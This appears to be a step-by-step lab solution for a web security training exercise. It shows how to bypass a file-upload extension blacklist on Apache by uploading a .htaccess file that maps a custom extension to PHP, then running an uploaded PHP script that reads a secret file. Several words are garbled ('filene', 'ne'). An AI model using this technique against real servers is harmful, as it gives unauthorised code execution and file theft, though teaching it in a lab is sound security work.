-   Log in and upload an image as your avatar, then go back to your account page.
-   In Burp, go to **Proxy > HTTP history** and notice that your image was fetched using a `GET` request to `/files/avatars/<YOUR-IMAGE>`. Send this request to Burp Repeater.
-   On your system, create a file called `exploit.php` containing a script for fetching the contents of Carlos's secret. For example:
    
    `<?php echo file_get_contents('/home/carlos/secret'); ?>`
-   Attempt to upload this script as your avatar. The response indicates that you are not allowed to upload files with a `.php` extension.
-   In Burp's proxy history, find the `POST /my-account/avatar` request that was used to submit the file upload. In the response, notice that the headers reveal that you're talking to an Apache server. Send this request to Burp Repeater.
-   In Burp Repeater, go to the tab for the `POST /my-account/avatar` request and find the part of the body that relates to your PHP file. Make the following changes:
    -   Change the value of the `filene` parameter to `.htaccess`.
    -   Change the value of the `Content-Type` header to `text/plain`.
    -   Replace the contents of the file (your PHP payload) with the following Apache directive:
        
        `AddType application/x-httpd-php .l33t`
        
        This maps an arbitrary extension (`.l33t`) to the executable MIME type `application/x-httpd-php`. As the server uses the `mod_php` module, it knows how to handle this already.
        
-   Send the request and observe that the file was successfully uploaded.
-   Use the back arrow in Burp Repeater to return to the original request for uploading your PHP exploit.
-   Change the value of the `filene` parameter from `exploit.php` to `exploit.l33t`. Send the request again and notice that the file was uploaded successfully.
-   Switch to the other Repeater tab containing the `GET /files/avatars/<YOUR-IMAGE>` request. In the path, replace the ne of your image file with `exploit.l33t` and send the request. Observe that Carlos's secret was returned in the response. Thanks to our malicious `.htaccess` file, the `.l33t` file was executed as if it were a `.php` file.
